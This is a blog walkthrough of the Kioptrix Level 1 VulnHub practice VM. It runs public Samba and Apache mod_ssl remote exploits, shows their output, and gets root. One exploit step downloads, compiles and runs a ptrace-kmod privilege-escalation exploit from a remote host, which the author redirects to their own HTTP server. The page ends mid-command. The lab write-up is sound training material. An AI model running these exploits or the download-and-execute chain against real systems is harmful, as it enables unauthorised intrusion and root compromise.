b'\n<head>\n    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">\n    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n    <script>\n        // UNCOMMENT AND USE YOUR VARIABLES FOR DISQUS AND GOOGLE ANALYTICS\n        // var d_id  = \'\',\n        //     g_id  = \'UA-XXXXXXXX-X\', // Format: UA-########-#, Example: UA-11220899-1\n        //     g_url = \'XXXXXXX.XXX\' // Format: #####.####, Example: webdesignporto.com\n    </script>\n\n    <title>Kioptrix: Level 1 (#1) Walkthrough</title>\n\n    <meta name="HandheldFriendly" content="True">\n    <meta name="MobileOptimized" content="320">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n\n    <link rel="stylesheet" type="text/css" href="../assets/highlighter/prettify.css?v=e7e99fee41">\n    <link rel="stylesheet" type="text/css" href="../assets/css/screen.css?v=e7e99fee41">\n\n    <link rel="canonical" href="index.html">\n    <meta name="referrer" content="no-referrer-when-downgrade">\n    <link rel="amphtml" href="amp/index.html">\n    \n    <meta property="og:site_name" content="rootshellz">\n    <meta property="og:type" content="article">\n    <meta property="og:title" content="Kioptrix: Level 1 (#1) Walkthrough">\n    <meta property="og:description" content="Intro Defcon 25 is in the books and my Penetration Testing Training with Kali Linux (PWK) / Offensive Security Certified Professional (OSCP) lab time is up.  I now have a bit of extra time but I also want to keep my forward momentum in the land of pwning boxes...  Accordingly, this">\n    <meta property="og:url" content="http://localhost:3001/kioptrix-walkthrough-1/">\n    <meta property="og:image" content="http://localhost:3001/content/images/2018/07/Kioptrix-1-Cover.jpg">\n    <meta property="article:published_time" content="2017-08-16T05:24:00.000Z">\n    <meta property="article:modified_time" content="2018-07-30T08:01:35.000Z">\n    <meta property="article:tag" content="Boot2Root">\n    <meta property="article:tag" content="VulnHub">\n    <meta property="article:tag" content="OSCP">\n    <meta property="article:tag" content="Kioptrix">\n    \n    <meta name="twitter:card" content="summary_large_image">\n    <meta name="twitter:title" content="Kioptrix: Level 1 (#1) Walkthrough">\n    <meta name="twitter:description" content="Intro Defcon 25 is in the books and my Penetration Testing Training with Kali Linux (PWK) / Offensive Security Certified Professional (OSCP) lab time is up.  I now have a bit of extra time but I also want to keep my forward momentum in the land of pwning boxes...  Accordingly, this">\n    <meta name="twitter:url" content="http://localhost:3001/kioptrix-walkthrough-1/">\n    <meta name="twitter:image" content="http://localhost:3001/content/images/2018/07/Kioptrix-1-Cover.jpg">\n    <meta name="twitter:label1" content="Written by">\n    <meta name="twitter:data1" content="rootshellz">\n    <meta name="twitter:label2" content="Filed under">\n    <meta name="twitter:data2" content="Boot2Root, VulnHub, OSCP, Kioptrix">\n    <meta name="twitter:site" content="@rootshellz">\n    <meta name="twitter:creator" content="@rootshellz">\n    <meta property="og:image:width" content="660">\n    <meta property="og:image:height" content="371">\n    \n    <script type="application/ld+json">\n{\n    "@context": "https://schema.org",\n    "@type": "Article",\n    "publisher": {\n        "@type": "Organization",\n        "name": "rootshellz",\n        "url": "http://localhost:3001/",\n        "logo": {\n            "@type": "ImageObject",\n            "url": "http://localhost:3001/content/images/2018/07/Blog-Logo.png"\n        }\n    },\n    "author": {\n        "@type": "Person",\n        "name": "rootshellz",\n        "image": {\n            "@type": "ImageObject",\n            "url": "http://localhost:3001/content/images/2018/07/rootshellz.jpg",\n            "width": 1630,\n            "height": 1631\n        },\n        "url": "http://localhost:3001/author/rootshellz/",\n        "sameAs": [\n            "https://twitter.com/rootshellz"\n        ]\n    },\n    "headline": "Kioptrix: Level 1 (#1) Walkthrough",\n    "url": "http://localhost:3001/kioptrix-walkthrough-1/",\n    "datePublished": "2017-08-16T05:24:00.000Z",\n    "dateModified": "2018-07-30T08:01:35.000Z",\n    "image": {\n        "@type": "ImageObject",\n        "url": "http://localhost:3001/content/images/2018/07/Kioptrix-1-Cover.jpg",\n        "width": 660,\n        "height": 371\n    },\n    "keywords": "Boot2Root, VulnHub, OSCP, Kioptrix",\n    "description": "Intro\\nDefcon 25 [https://www.defcon.org/html/defcon-25/dc-25-index.html]  is in the\\nbooks and my Penetration Testing Training with Kali Linux (PWK)\\n[https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/] \\n / Offensive Security Certified Professional (OSCP)\\n[https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/] \\n lab time is up. I now have a bit of extra time but I also want to ke",\n    "mainEntityOfPage": {\n        "@type": "WebPage",\n        "@id": "http://localhost:3001/"\n    }\n}\n    </script>\n\n    <meta name="generator" content="Ghost 3.36">\n    <link rel="alternate" type="application/rss+xml" title="rootshellz" href="../rss/index.html">\n    <link href="https://rootshellz.github.io/prism.css" rel="stylesheet">\n\n<script>\n  (function(i,s,o,g,r,a,m){i[\'GoogleAnalyticsObject\']=r;i[r]=i[r]||function(){\n  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),\n  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\n  })(window,document,\'script\',\'https://www.google-analytics.com/analytics.js\',\'ga\');\n\n  ga(\'create\', \'UA-104761302-1\', \'auto\');\n  ga(\'send\', \'pageview\');\n\n</script>\n\n    <script>\n      (function(i,s,o,g,r,a,m){i[\'GoogleAnalyticsObject\']=r;i[r]=i[r]||function(){\n      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),\n      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)\n      })(window,document,\'script\',\'//www.google-analytics.com/analytics.js\',\'ga\');\n\n      ga(\'create\', g_id, g_url);\n      ga(\'send\', \'pageview\');\n\n    </script>\n</head>\n<body class="post-template tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">\n\n    \n\n<main class="content" role="main">\n\n    <article class="post tag-boot2root tag-vulnhub tag-oscp tag-kioptrix">\n\n        <header class="post-header">\n            <a id="blog-logo" href="../">\n                    <img src="../content/images/2018/07/Blog-Logo.png" alt="Blog Logo">\n            </a>\n        </header>\n\n\n        <span class="post-meta"><time datetime="2017-08-15">15 Aug 2017</time> on <a href="../tag/boot2root/">Boot2Root</a> | <a href="../tag/vulnhub/">VulnHub</a> | <a href="../tag/oscp/">OSCP</a> | <a href="../tag/kioptrix/">Kioptrix</a></span>\n\n        <h1 class="post-title">Kioptrix: Level 1 (#1) Walkthrough</h1>\n\n        <section class="post-content">\n            <!--kg-card-begin: markdown--><h1 id="intro">Intro</h1>\n<p><a href="https://www.defcon.org/html/defcon-25/dc-25-index.html">Defcon 25</a> is in the books and my <a href="https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/">Penetration Testing Training with Kali Linux (PWK)</a> / <a href="https://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/">Offensive Security Certified Professional (OSCP)</a> lab time is up.  I now have a bit of extra time but I also want to keep my forward momentum in the land of pwning boxes...  Accordingly, this seems like an opportune time to start posting, and what better topic than gaining root shellz?</p>\n<p>I went in search of pwnables that were similar to the boxes I experienced in the PWK lab and found the <a href="http://www.kioptrix.com/blog/test-page/">Kioptrix</a> series of VMs recommended.  The series is also on <a href="https://www.vulnhub.com/series/kioptrix,8/">VulnHub</a>.  Kioptrix consists of five machines, each of increasing difficulty.  The challenges appear to be a bit older, but still seem relevant.</p>\n<p>For those that don\'t know, a pwnable or Boot2Root is an intentionally vulnerable virtual machine (VM) that provides a challenge to hackers.  The goal is usually to root the box.  Some challenges have an intended solution and guide you down the correct path, others expect you to attack the box by any means necessary.</p>\n<p>Let\'s get started with the first box.  I downloaded the .rar file, decompressed it, and spun up the VM in <a href="https://www.vmware.com/products/fusion.html">VMware Fusion</a>.  After booting, I was presented with the following screen:<br>\n<img src="../content/images/2017/08/Kioptrix1-VM-Console.png" alt="Kioptrix1-VM-Console"></p>\n<h1 id="scanningandenumeration">Scanning and Enumeration</h1>\n<h2 id="identifyingtargetaddressdhcp">Identifying Target Address (DHCP)</h2>\n<p>The host grabs an address via DHCP as it boots.  Identifying the host on my network was simple as the VM is in a low traffic local subnet on my host machine.</p>\n<pre><code class="language-shell-output">root@kali:~# ifconfig eth1 | grep "inet\\s"\ninet 172.16.2.129  netmask 255.255.255.0  broadcast 172.16.2.255\n</code></pre>\n<pre><code class="language-shell-output">root@kali:~# nmap -T4 -sn 172.16.2.0/24\n\nStarting Nmap 7.25BETA2 ( https://nmap.org )\nNmap scan report for 172.16.2.1\nHost is up (0.0011s latency).\nMAC Address: 00:50:56:C0:00:02 (VMware)\nNmap scan report for 172.16.2.130\nHost is up (0.00027s latency).\nMAC Address: 00:0C:29:E8:BF:7E (VMware)\nNmap scan report for 172.16.2.254\nHost is up (0.00017s latency).\nMAC Address: 00:50:56:E8:27:6D (VMware)\nNmap scan report for 172.16.2.129\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 13.11 seconds\n</code></pre>\n<p>The scan shows only four live IPs on my target subnet (172.16.2.0/24): the gateway (.1), DHCP server (.254), my Kali machine (.129), and the target, Kioptrix1, which has been assigned 172.16.2.130.</p>\n<h2 id="enumerateallthethings">Enumerate All the things</h2>\n<h3 id="nmap">nmap</h3>\n<pre><code class="language-shell-output">root@kali:~# nmap -T4 -Pn -sV -O -p- 172.16.2.130\n\nStarting Nmap 7.25BETA2 ( https://nmap.org )\nNmap scan report for 172.16.2.130\nHost is up (0.00042s latency).\nNot shown: 65528 closed ports\nPORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)\n80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)\n111/tcp   open  rpcbind     2 (RPC #100000)\n139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)\n443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b\n1024/tcp  open  status      1 (RPC #100024)\n45295/tcp open  unknown\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port45295-TCP:V=7.25BETA2%I=7%D=8/12%Time=598EC8C9%P=i686-pc-linux-gnu%\nSF:r(GenericLines,3E,"/bin//sh:\\x20\\r:\\x20command\\x20not\\x20found\\n/bin//s\nSF:h:\\x20\\r:\\x20command\\x20not\\x20found\\n")%r(GetRequest,1FD,"Can\'t\\x20ign\nSF:ore\\x20signal\\x20CHLD,\\x20forcing\\x20to\\x20default\\.\\nUse\\x20of\\x20unin\nSF:itialized\\x20value\\x20in\\x20pattern\\x20match\\x20\\(m//\\)\\x20at\\x20/usr/l\nSF:ib/perl5/site_perl/5\\.6\\.0/URI/Heuristic\\.pm\\x20line\\x2097\\.\\n&lt;HTML&gt;\\n&lt;\nSF:HEAD&gt;&lt;TITLE&gt;An\\x20Error\\x20Occurred&lt;/TITLE&gt;&lt;/HEAD&gt;\\n&lt;BODY&gt;\\n&lt;H1&gt;An\\x20E\nSF:rror\\x20Occurred&lt;/h1&gt;\\n500\\x20Can\'t\\x20locate\\x20object\\x20method\\x20\\"\nSF:epath\\"\\x20via\\x20package\\x20\\"URI::file\\"\\n\\n&lt;/BODY&gt;\\n&lt;/HTML&gt;\\n&lt;HTML&gt;\\\nSF:n&lt;HEAD&gt;&lt;TITLE&gt;An\\x20Error\\x20Occurred&lt;/TITLE&gt;&lt;/HEAD&gt;\\n&lt;BODY&gt;\\n&lt;H1&gt;An\\x2\nSF:0Error\\x20Occurred&lt;/h1&gt;\\n500\\x20Can\'t\\x20connect\\x20to\\x20HTTP:80\\x20\\(\nSF:Bad\\x20hostname\\x20\'HTTP\'\\)\\n\\n&lt;/BODY&gt;\\n&lt;/HTML&gt;\\n/bin//sh:\\x20\\r:\\x20co\nSF:mmand\\x20not\\x20found\\n")%r(HTTPOptions,44,"/bin//sh:\\x20OPTIONS:\\x20co\nSF:mmand\\x20not\\x20found\\n/bin//sh:\\x20\\r:\\x20command\\x20not\\x20found\\n")%\nSF:r(RTSPRequest,44,"/bin//sh:\\x20OPTIONS:\\x20command\\x20not\\x20found\\n/bi\nSF:n//sh:\\x20\\r:\\x20command\\x20not\\x20found\\n")%r(Help,23,"/bin//sh:\\x20HE\nSF:LP\\r:\\x20command\\x20not\\x20found\\n")%r(TLSSessionReq,4F,"/bin//sh:\\x20\\\nSF:x16\\x03i\\x01e\\x03\\x03U\\x1c\\xa7\\xe4random1random2random3random4\\x0c/:\\x2\nSF:0No\\x20such\\x20file\\x20or\\x20directory\\n")%r(Kerberos,2E,"/bin//sh:\\x20\nSF:qj\\x81n0\\x81k\\xa1\\x03\\x02\\x01\\x05\\xa2\\x03\\x02\\x01:\\x20command\\x20not\\x2\nSF:0found\\n")%r(FourOhFourRequest,1F4,"Can\'t\\x20ignore\\x20signal\\x20CHLD,\\\nSF:x20forcing\\x20to\\x20default\\.\\nUse\\x20of\\x20uninitialized\\x20value\\x20i\nSF:n\\x20pattern\\x20match\\x20\\(m//\\)\\x20at\\x20/usr/lib/perl5/site_perl/5\\.6\nSF:\\.0/URI/Heuristic\\.pm\\x20line\\x2097\\.\\n&lt;HTML&gt;\\n&lt;HEAD&gt;&lt;TITLE&gt;An\\x20Error\nSF:\\x20Occurred&lt;/TITLE&gt;&lt;/HEAD&gt;\\n&lt;BODY&gt;\\n&lt;H1&gt;An\\x20Error\\x20Occurred&lt;/h1&gt;\\n\nSF:404\\x20File\\x20`/nice\\x20ports,/Trinity\\.txt\\.bak\'\\x20does\\x20not\\x20ex\nSF:ist\\n&lt;/BODY&gt;\\n&lt;/HTML&gt;\\n&lt;HTML&gt;\\n&lt;HEAD&gt;&lt;TITLE&gt;An\\x20Error\\x20Occurred&lt;/TI\nSF:TLE&gt;&lt;/HEAD&gt;\\n&lt;BODY&gt;\\n&lt;H1&gt;An\\x20Error\\x20Occurred&lt;/h1&gt;\\n500\\x20Can\'t\\x20\nSF:connect\\x20to\\x20HTTP:80\\x20\\(Bad\\x20hostname\\x20\'HTTP\'\\)\\n\\n&lt;/BODY&gt;\\n&lt;\nSF:/HTML&gt;\\n/bin//sh:\\x20\\r:\\x20command\\x20not\\x20found\\n");\nMAC Address: 00:0C:29:E8:BF:7E (VMware)\nDevice type: general purpose\nRunning: Linux 2.4.X\nOS CPE: cpe:/o:linux:linux_kernel:2.4\nOS details: Linux 2.4.9 - 2.4.18 (likely embedded)\nNetwork Distance: 1 hop\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 144.28 seconds\n</code></pre>\n<p>There is plenty going on here, so I started by running the OpenSSH, Apache, mod_ssl, and OpenSSL versions through <a href="https://www.exploit-db.com/">Exploit DB</a>.  There were some decent matches, but I wanted to dig in to the SMB service first.  Usually when SMB fails, it fails hard...</p>\n<h1 id="exploitation1smb">Exploitation #1 - SMB</h1>\n<p>I wanted to get more info on the netbios service (on 139/tcp) at least get a version.</p>\n<pre><code class="language-shell-output">root@kali:~# enum4linux 172.16.2.130\nStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ )\n\n[... snip ...]\n\n ====================================== \n|    OS information on 172.16.2.130    |\n ====================================== \n[+] Got OS info for 172.16.2.130 from smbclient: Domain=[MYGROUP] OS=[Unix] Server=[Samba 2.2.1a]\n[+] Got OS info for 172.16.2.130 from srvinfo:\n  KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server\n  platform_id     : 500\n  os version      : 4.5\n  server type     : 0x9a03\n\n[... snip ...]\n\nenum4linux complete on Fri Aug 11 22:42:00 2017\n</code></pre>\n<p>Ahh, there\'s the version: Samba <em>2.2.1a</em>, which I then ran through Exploit DB:</p>\n<pre><code class="language-shell-output">root@kali:~# searchsploit Samba | grep "2\\.2\\."\nSamba 2.2.x - Remote Root Buffer Overflow                            | ./linux/remote/7.pl\n[... snip ...]\n</code></pre>\n<p>This looked promising, so I attempted the exploit:</p>\n<pre><code class="language-shell-output">root@kali:~# perl /usr/share/exploitdb/platforms/linux/remote/7.pl\n\n trans2root.pl - Samba 2.2.x \'trans2open()\' Remote Exploit\n===================================\n\n    Usage: \n           /usr/share/exploitdb/platforms/linux/remote/7.pl &lt;options&gt; -t &lt;target type&gt; -H &lt;your ip&gt; -h &lt;target ip&gt;\n  Options:  \n           -M (S|B) &lt;single or brute mode&gt;\n           -r       &lt;return address for single mode&gt;\n           -p       &lt;alternate Samba port&gt;\n           -P       &lt;alternate listener port&gt;\n  Targets:\n            linx86\n            solx86\n            fbsdx86\n</code></pre>\n<pre><code class="language-shell-output">root@kali:~# perl /usr/share/exploitdb/platforms/linux/remote/7.pl -t linx86 -H 172.16.2.129 -h 172.16.2.130\n[*] Using target type: linx86\n[*] Listener started on port 1981\n[*] Starting brute force mode...\n[*] Return Address: 0xbf0001ff                              \nroot@kali:~#\n</code></pre>\n<p>Unfortunately, after running through the address brute-force, this exploit script did not seem to do the trick.</p>\n<p>I was still convinced that this vulnerability was exploitable, so I went looking for another working exploit.  I simply Googled "Samba 2.2.1a" and my first hit was for an exploit actually labeled Samba 2.2.<em>8</em>, but stated, "Remote root exploit for Samba 2.2.x and prior that works against Linux (all distributions) [...]."</p>\n<p><img src="../content/images/2017/08/Google-Samba-2.2.1a.png" alt="Google-Samba-2.2.1a"></p>\n<p>As a side note, this exploit labeling makes it difficult to identify this exploit with the searchsploit tool.  If anyone know how to better use searchsploit, let me know.</p>\n<p>At any rate, I located, compiled, and ran the exploit:</p>\n<pre><code class="language-shell-output">root@kali:~# searchsploit "Samba 2.2.8"\n------------------------------------------------------------------------------------------------------------------- ----------------------------------\n Exploit Title                                                                                                     |  Path\n                                                                                                                   | (/usr/share/exploitdb/platforms)\n------------------------------------------------------------------------------------------------------------------- ----------------------------------\nSamba 2.2.8 - Remote Root Exploit                                                                                  | ./linux/remote/10.c\n</code></pre>\n<pre><code class="language-shell-output">root@kali:~# gcc -o sambasploit /usr/share/exploitdb/platforms/linux/remote/10.c \nroot@kali:~# file sambasploit \nsambasploit: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3209817b6f2b2e5f713e16f8e55dcf0fbb219feb, not stripped\n</code></pre>\n<pre><code class="language-shell-output">root@kali:~# ./sambasploit \nsamba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)\n--------------------------------------------------------------\nUsage: ./sambasploit [-bBcCdfprsStv] [host]\n\n-b &lt;platform&gt;   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)\n-B &lt;step&gt;       bruteforce steps (default = 300)\n-c &lt;ip address&gt; connectback ip address\n-C &lt;max childs&gt; max childs for scan/bruteforce mode (default = 40)\n-d &lt;delay&gt;      bruteforce/scanmode delay in micro seconds (default = 100000)\n-f              force\n-p &lt;port&gt;       port to attack (default = 139)\n-r &lt;ret&gt;        return address\n-s              scan mode (random)\n-S &lt;network&gt;    scan mode\n-t &lt;type&gt;       presets (0 for a list)\n-v              verbose mode\n</code></pre>\n<pre><code class="language-shell-output">root@kali:~# ./sambasploit -v -b 0 172.16.2.130\nsamba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)\n--------------------------------------------------------------\n+ Verbose mode.\n+ Bruteforce mode. (Linux)\n+ Host is running samba.\n+ Using ret: [0xbffffed4]\n+ Using ret: [0xbffffda8]\n+ Worked!\n--------------------------------------------------------------\n*** JE MOET JE MUIL HOUWE\nLinux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown\nuid=0(root) gid=0(root) groups=99(nobody)\nid    \nuid=0(root) gid=0(root) groups=99(nobody)\nwhoami\nroot\n</code></pre>\n<p>Boom, rootshellz!  At this point, instead of moving on to persistence and pilfering the box, I instead wanted to see if I could find any other ways to pwn Kioptrix1.</p>\n<p>Unfamiliar with "JE MOET JE MUIL HOUWE," I found it is Dutch for "YOU MUST HAVE YOUR MOUSE."  It is also, apparently, a <a href="https://www.youtube.com/watch?v=BcpirI2BcWI">hardcore song by Neophyte</a>.  If there is some further reference here, it is lost on me.</p>\n<h1 id="exploitation2apacheandmod_ssl">Exploitation #2 - Apache and mod_ssl</h1>\n<p>Searching for Apache and mod_ssl vulnerabilities / exploits turned up a promising hit:</p>\n<pre><code class="language-shell-output">root@kali:~# searchsploit apache mod_ssl\n---------------------------------------------------------------------------------------------------------------------------------- ----------------------------------\n Exploit Title                                                                                                                    |  Path\n                                                                                                                                  | (/usr/share/exploitdb/platforms)\n---------------------------------------------------------------------------------------------------------------------------------- ----------------------------------\nApache/mod_ssl (&lt; 2.8.7) OpenSSL - \'OpenFuckV2.c\' Remote Exploit (2)                                                              | ./unix/remote/764.c\n[... snip ...]\n</code></pre>\n<p>I attempted to compile this exploit, using libcrypto, but it failed miserably.  I did some Googling and found an article by <a href="http://paulsec.github.io/">PaulSec</a> about <a href="http://paulsec.github.io/blog/2014/04/14/updating-openfuck-exploit/">updating this exploit</a> for modern pwning.  PaulSec\'s modifications worked with two exceptions:  First, I had to change the URL, as suggested by PauSec, but I needed https instead of http (<a href="https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c">https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</a>).  Second, on my Kali install, I had to install libssl1.0-dev as opposed to just libssl1-dev.  In fact, this required removing my existing libssl-dev package.  Once all modifications were made to the exploit an my build environment, I was able to compile and use the exploit:</p>\n<pre><code class="language-shell-output">root@kali:~# gcc -o OpenFuckIn2017 OpenFuckIn2017.c -lcrypto\nroot@kali:~# file OpenFuckIn2017\nOpenFuckIn2017: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b6026a5ef5267c1ff4612467c68fe9f24f8449c9, not stripped\n</code></pre>\n<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017\n\n*******************************************************************\n* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\n: Usage: ./OpenFuckIn2017 target box [port] [-c N]\n\n  target - supported box eg: 0x00\n  box - hostname or IP address\n  port - port for ssl connection\n  -c open N connections. (use range 40-50 if u dont know)\n  \n\n  Supported OffSet:\n  [... snip ...]\nFuck to all guys who like use lamah ddos. Read SRC to have no surprise\n</code></pre>\n<p>I needed to identify the target to use:</p>\n<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017 | grep RedHat | grep 1.3.20\n  0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1\n  0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2\n</code></pre>\n<p>I attempted the first target without luck:</p>\n<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017 0x6a 172.16.2.130\n\n*******************************************************************\n* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\nEstablishing SSL connection\ncipher: 0x4043808c   ciphers: 0x80fc080\nReady to send shellcode\nSpawning shell...\nGood Bye!\n</code></pre>\n<p>So I moved on to the second:</p>\n<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017 0x6b 172.16.2.130\n\n*******************************************************************\n* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\nEstablishing SSL connection\ncipher: 0x4043808c   ciphers: 0x80f8068\nReady to send shellcode\nSpawning shell...\nbash: no job control in this shell\nbash-2.05$ \nexploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304- \n--01:17:47--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c\n           =&gt; `ptrace-kmod.c\'\nConnecting to dl.packetstormsecurity.net:80... \ndl.packetstormsecurity.net: Host not found.\ngcc: ptrace-kmod.c: No such file or directory\ngcc: No input files\nrm: cannot remove `ptrace-kmod.c\': No such file or directory\nbash: ./p: No such file or directory\nbash-2.05$ \nbash-2.05$ id\nid\nuid=48(apache) gid=48(apache) groups=48(apache)\nbash-2.05$ pwd\npwd\n/tmp\n</code></pre>\n<p>Awesome, I received a shell, albeit not root.  This is when I discovered that because I set up Kioptrix1 without Internet access, my initial remote exploit was unable to download the ptrace/kmod local root exploit from packetstormsecurity.net.  I proceeded to stage the privilege escalation exploit locally on my Kali box:</p>\n<pre><code class="language-shell-output">root@kali:~# wget http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c\n--2017-08-13 10:56:21--  http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c\nResolving dl.packetstormsecurity.net (dl.packetstormsecurity.net)... 198.84.60.200\nConnecting to dl.packetstormsecurity.net (dl.packetstormsecurity.net)|198.84.60.200|:80... connected.\nHTTP request sent, awaiting response... 301 Moved Permanently\nLocation: https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c [following]\n--2017-08-13 10:56:22--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c\nConnecting to dl.packetstormsecurity.net (dl.packetstormsecurity.net)|198.84.60.200|:443... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 3921 (3.8K) [text/x-csrc]\nSaving to: \xe2\x80\x98ptrace-kmod.c\xe2\x80\x99\n\nptrace-kmod.c                                        100%[====================================================================================================================&gt;]   3.83K  --.-KB/s    in 0s      \n\n2017-08-13 10:56:22 (70.1 MB/s) - \xe2\x80\x98ptrace-kmod.c\xe2\x80\x99 saved [3921/3921]\n</code></pre>\n<p>I then updated my exploit to download the file from my Kali box, again using the Python Simple HTTP server.</p>\n<pre><code class="language-shell-output">root@kali:~# cp OpenFuckIn2017.c OpenFuckIn2017LocalDL.c\nroot@kali:~# sed -i \'s*https://dl.packetstormsecurity.net/0304-exploits/*http://172.16.2.129:8000/*\' OpenFuckIn2017LocalDL.c\nroot@kali:~# gcc -o OpenFuckIn2017LocalDL OpenFuckIn2017LocalDL.c -lcrypto\n</code></pre>\n<pre><code class="language-shell-output">root@kali:~# python -m SimpleHTTPServer\nServing HTTP on 0.0.0.0 port 8000 ...\n172.16.2.130 - - [13/Aug/2017 11:03:20] "GET /ptrace-kmod.c HTTP/1.0" 200 -\n</code></pre>\n<pre><code class="language-shell-output">root@kali:~# ./OpenFuckIn2017LocalDL 0x6b 172.16.2.130\n\n*******************************************************************\n* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *\n*******************************************************************\n* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *\n* #hackarena  irc.brasnet.org                                     *\n* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *\n* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *\n* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *\n*******************************************************************\n\nEstablishing SSL connection\ncipher: 0x4043808c   ciphers: 0x80f8068\nReady to send shellcode\nSpawning shell...\nbash: no job control in this shell\nbash-2.05$ \n gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; 172.16.2.129:8000/ptrace-kmod.c; \n--00:02:13--  http://172.16.2.129:8000/ptrace-kmod.c\n           =&gt; `ptrace-kmod.c\'\nConnecting to 172.16.2.129:8000... connected!\nHTTP request sent, awaiting response... 200 OK\nLength: 3,921 [text/plain]\n\n    0K ...                                                   100% @   3.74 MB/s\n\n00:02:13 (3.74 MB/s) - `ptrace-kmod.c\' saved [3921/3921]\n\n[+] Attached to 984\n[+] Waiting for signal\n[+] Signal caught\n[+] Shellcode placed at 0x4001189d\n[+] Now wait for suid shell...\nwhoami\nroot\n\nid\nuid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)\n\ncat 